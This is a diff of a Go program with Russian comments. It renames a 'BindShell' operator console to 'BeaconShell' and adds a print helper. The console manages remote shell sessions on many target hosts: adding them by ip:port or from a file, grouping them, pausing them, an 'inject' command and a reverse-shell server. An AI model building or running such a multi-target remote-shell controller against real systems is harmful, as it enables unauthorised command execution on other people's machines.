@@ -14,8 +14,8 @@ var global_buffer_size int = 4096
 var active_targets int = 0
 
 // Предоставляет список встроенных команд (вызов: /BS help).
-func BindShellHelp() {
-	fmt.Println("[BindShell] Command list:")
+func BeaconShellHelp() {
+	BSPrint("Command list:")
 	fmt.Println("\n\t\tTargets status:")
 	fmt.Println("\t- /BS targets \t\t\tShow current targets list;")
 	fmt.Println("\t- /BS add <ip:port> \t\tAdd target <ip:port> to set;")
@@ -46,18 +46,18 @@ func BindShellHelp() {
 }
 
 // Завершает работу программы (вызов: /BS stop)
-func BindShellStop(targets *[]Target) {
+func BeaconShellStop(targets *[]Target) {
 	// Завершение всех активных соединений
 	finishAllSessions(targets)
 
 	// Завершение программы
-	fmt.Println("[BindShell] Shutdown...")
+	BSPrint("Shutdown...")
 	os.Exit(0)
 }
 
 // Выводит список целевых хостов (вызов: /BS targets)
-func BindShellTargets(targets *[]Target) {
-	fmt.Printf("[BindShell] Current targets (active: %d, total: %d):\n", active_targets, len(*targets))
+func BeaconShellTargets(targets *[]Target) {
+	BSPrint("Current targets (active: %d, total: %d):\n", active_targets, len(*targets))
 	for i := 0; i < len(*targets); i++ {
 		if (*targets)[i].status == true {
 			fmt.Printf("\t<%d> [+] (%s) %s\n", i, (*targets)[i].group, (*targets)[i].name)
@@ -68,67 +68,67 @@ func BindShellTargets(targets *[]Target) {
 }
 
 // Удаляет выбранный хост из списка целей и завершает с ним сессию (вызов: /BS remove)
-func BindShellRemove(targets *[]Target, idx int) {
+func BeaconShellRemove(targets *[]Target, idx int) {
 	active_targets--
 
 	// Завершение сессии удаляемого хоста
 	finishSession((*targets)[idx])
 
-	fmt.Printf("[BindShell] %s << Host removed from target list.\n", (*targets)[idx].name)
+	BSPrint("%s removed from target list.\n", (*targets)[idx].name)
 
 	// Удаление хоста из списка целей
 	*targets = append((*targets)[:idx], (*targets)[idx+1:]...)
 }
 
 // Приостановление взаимодействия с целью (вызов: /BS off)
-func BindShellOff(targets *[]Target, idx int) {
+func BeaconShellOff(targets *[]Target, idx int) {
 	if (*targets)[idx].status == false {
-		fmt.Println("[BindShell] The host is already an inactive target!")
+		BSPrint("The host is already an inactive target!\n")
 		return
 	}
 
 	active_targets--
 	(*targets)[idx].status = false
-	fmt.Printf("[BindShell] %s off.\n", (*targets)[idx].name)
+	BSPrint("%s off.\n", (*targets)[idx].name)
 }
 
 // Возобновление взаимодействия с целью (вызов: /BS on)
-func BindShellOn(targets *[]Target, idx int) {
+func BeaconShellOn(targets *[]Target, idx int) {
 	if (*targets)[idx].status == true {
-		fmt.Println("[BindShell] The host is already an active target!")
+		BSPrint("The host is already an active target!\n")
 		return
 	}
 
 	active_targets++
 	(*targets)[idx].status = true
-	fmt.Printf("[BindShell] %s on.\n", (*targets)[idx].name)
+	BSPrint("%s on.\n", (*targets)[idx].name)
 }
 
 // Вывод сведений о текущей конфигурации
-func BindShellConfig() {
-	fmt.Println("[BindShell] Current configuration:")
+func BeaconShellConfig() {
+	BSPrint("Current configuration:\n")
 	fmt.Printf("\tResponse timeout: %d millisecond(s).\n", global_response_timeout)
 	fmt.Printf("\tBuffer size: %d byte(s).\n", global_buffer_size)
 }
 
 // Устанавливает значение переменной global_response_timeout равным value (вызов: /BS timeout)
-func BindShellTimeout(value int) {
+func BeaconShellTimeout(value int) {
 	global_response_timeout = value
-	fmt.Printf("[BindShell] Response timeout set to %d millisecond(s).\n", global_response_timeout)
+	BSPrint("Response timeout set: %d millisecond(s).\n", global_response_timeout)
 }
 
 // Устанавливает значение переменной global_buffer_size равным value (вызов: /BS buffer)
-func BindShellBufferSize(value int) {
+func BeaconShellBufferSize(value int) {
 	global_buffer_size = value
-	fmt.Printf("[BindShell] Buffer size set to %d byte(s).\n", global_buffer_size)
+	BSPrint("Buffer size set to %d byte(s).\n", global_buffer_size)
 }
 
 // Устанавливает соединение с выбранным хостом и добавляет его в список целей (вызов: /BS add)
-func BindShellAdd(targets *[]Target, target_name string) {
+func BeaconShellAdd(targets *[]Target, target_name string) {
 	addSession(targets, target_name)
 }
 
-func BindShellListAdd(targets *[]Target, targets_file string) {
+func BeaconShellListAdd(targets *[]Target, targets_file string) {
 	// Открытие файла с новыми целями
 	file, err := os.Open(targets_file)
 	if err != nil {
@@ -162,15 +162,15 @@ func BindShellListAdd(targets *[]Target, targets_file string) {
 	}
 }
 
-func BindShellGroup(targets *[]Target, idx int, group_name string) {
+func BeaconShellGroup(targets *[]Target, idx int, group_name string) {
 	(*targets)[idx].group = group_name
-	fmt.Printf("[BindShell] %s group set: %s\n", (*targets)[idx].name, group_name)
+	BSPrint("%s group set: %s.\n", (*targets)[idx].name, group_name)
 }
 
-func BindShellRequest(request []string, targets *[]Target) {
+func BeaconShellRequest(request []string, targets *[]Target) {
 	// В случае, если конкретная инструкция не указана, вызывается /BS help
 	if len(request) == 1 {
-		BindShellHelp()
+		BeaconShellHelp()
 		return
 	}
 
@@ -181,41 +181,41 @@ func BindShellRequest(request []string, targets *[]Target) {
 		}
 
 		if request[2] == "list" {
-			BindShellListAdd(targets, request[3])
+			BeaconShellListAdd(targets, request[3])
 		} else {
-			BindShellAdd(targets, request[2])
+			BeaconShellAdd(targets, request[2])
 		}
 	case "buffer":
 		ok, value := checkPositiveNumber(request[2])
 		if ok {
-			BindShellBufferSize(value)
+			BeaconShellBufferSize(value)
 		}
 	case "config":
-		BindShellConfig()
+		BeaconShellConfig()
 	case "help":
-		BindShellHelp()
+		BeaconShellHelp()
 	case "inject":
 		ok, value := checkPositiveNumber(request[7])
 		if ok {
-			BindShellInject(request[2], request[3], request[4], request[5], request[6], value)
+			BeaconShellInject(request[2], request[3], request[4], request[5], request[6], value)
 		}
 	case "group":
 		ok, idx := checkTargetNumber(targets, request[3])
 
 		if ok {
-			BindShellGroup(targets, idx, request[2])
+			BeaconShellGroup(targets, idx, request[2])
 		}
 	case "off":
 		// Если аргументов более трех, остановка
 		if len(request) > 4 {
-			fmt.Println("[BindShell] Error! Correct usage: \"/BS off\" or \"/BS off <host_id>\"")
+			BSPrint("Error! Correct usage: \"/BS off\", \"/BS off <host_id>\" or \"/BS off group <group>\".\n")
 			return
 		}
 
 		// Если не указан конкретный хост, приостановить всё
 		if len(request) == 2 {
 			for i := 0; i < len(*targets); i++ {
-				BindShellOff(targets, i)
+				BeaconShellOff(targets, i)
 			}
 			return
 		}
@@ -224,7 +224,7 @@ func BindShellRequest(request []string, targets *[]Target) {
 		if len(request) == 4 && request[2] == "group" {
 			for i := 0; i < len(*targets); i++ {
 				if (*targets)[i].group == request[3] {
-					BindShellOff(targets, i)
+					BeaconShellOff(targets, i)
 				}
 			}
 			return
@@ -235,19 +235,19 @@ func BindShellRequest(request []string, targets *[]Target) {
 
 		// Если идентификатор корректен, приостановить действия на выбранном хосте
 		if ok {
-			BindShellOff(targets, idx)
+			BeaconShellOff(targets, idx)
 		}
 	case "on":
 		// Если аргументов более трех, остановка
 		if len(request) > 4 {
-			fmt.Println("[BindShell] Error! Correct usage: \"/BS on\" or \"/BS on <host_id>\"")
+			BSPrint("Error! Correct usage: \"/BS on\", \"/BS on <host_id>\" or \"/BS on group <group>\".\n")
 			return
 		}
 
 		// Если не указан конкретный хост, возобновить всё
 		if len(request) == 2 {
 			for i := 0; i < len(*targets); i++ {
-				BindShellOn(targets, i)
+				BeaconShellOn(targets, i)
 			}
 			return
 		}
@@ -256,7 +256,7 @@ func BindShellRequest(request []string, targets *[]Target) {
 		if len(request) == 4 && request[2] == "group" {
 			for i := 0; i < len(*targets); i++ {
 				if (*targets)[i].group == request[3] {
-					BindShellOn(targets, i)
+					BeaconShellOn(targets, i)
 				}
 			}
 			return
@@ -267,12 +267,12 @@ func BindShellRequest(request []string, targets *[]Target) {
 
 		// Если идентификатор корректен, возобновить действия на выбранном хосте
 		if ok {
-			BindShellOn(targets, idx)
+			BeaconShellOn(targets, idx)
 		}
 	case "remove":
 		// Если аргументов более трех, остановка
 		if len(request) > 3 {
-			fmt.Println("[BindShell] Error! Correct usage: \"/BS remove\" or \"/BS remove <host_id>\"")
+			BSPrint("Error! Correct usage: \"/BS remove\", \"/BS remove <host_id>\" or \"/BS remove group <group>\".\n")
 			return
 		}
 
@@ -280,7 +280,7 @@ func BindShellRequest(request []string, targets *[]Target) {
 		if len(request) == 2 {
 			cnt := len(*targets)
 			for i := 0; i < cnt; i++ {
-				BindShellRemove(targets, 0)
+				BeaconShellRemove(targets, 0)
 			}
 			return
 		}
@@ -291,7 +291,7 @@ func BindShellRequest(request []string, targets *[]Target) {
 				cnt := len(*targets)
 				for i := 0; i < cnt; {
 					if (*targets)[i].group == request[3] {
-						BindShellOff(targets, i)
+						BeaconShellOff(targets, i)
 					} else {
 						i++
 					}
@@ -305,19 +305,19 @@ func BindShellRequest(request []string, targets *[]Target) {
 
 		// Если идентификатор корректен, удаляет выбранный хост
 		if ok {
-			BindShellRemove(targets, idx)
+			BeaconShellRemove(targets, idx)
 		}
 	case "stop":
-		BindShellStop(targets)
+		BeaconShellStop(targets)
 	case "targets":
-		BindShellTargets(targets)
+		BeaconShellTargets(targets)
 	case "timeout":
 		ok, value := checkPositiveNumber(request[2])
 		if ok {
-			BindShellTimeout(value)
+			BeaconShellTimeout(value)
 		}
 	default:
-		fmt.Println("[BindShell] Incorrect shell command!")
+		BSPrint("Incorrect shell command!\n")
 	}
 }
 
@@ -350,6 +350,10 @@ func ReverseShellStartServer(targets *[]Target) {
 	}
 }
 
+func BSPrint(format string, args ...interface{}) {
+	fmt.Printf("[BShell] "+format, args...)
+}
+
 func main() {
 	// Инициализация контейнера целей
 	targets := make([]Target, 0, 1)
@@ -361,10 +365,10 @@ func main() {
 	reader := bufio.NewReader(os.Stdin)
 
 	// Инструктаж пользователя
-	fmt.Printf("[BindShell] Print \"/BS help\" to get info.\n")
+	BSPrint("Print \"/BS help\" to get info.\n")
 	for {
 		// Приглашение к вводу команды
-		fmt.Print("[BindShell] >> ")
+		BSPrint(">> ")
 
 		// Считывание команды пользователя
 		input, _ := reader.ReadString('\n')
@@ -382,8 +386,8 @@ func main() {
 
 		// Проверка типа команды
 		if splitted_input[0] == "/BS" {
-			// Выполнение встроенной команды BindShell
-			BindShellRequest(splitted_input, &targets)
+			// Выполнение встроенной команды BeaconShell
+			BeaconShellRequest(splitted_input, &targets)
 		} else {
 			// Создание канала для получения результатов команд
 			ch_resp := make(chan string)
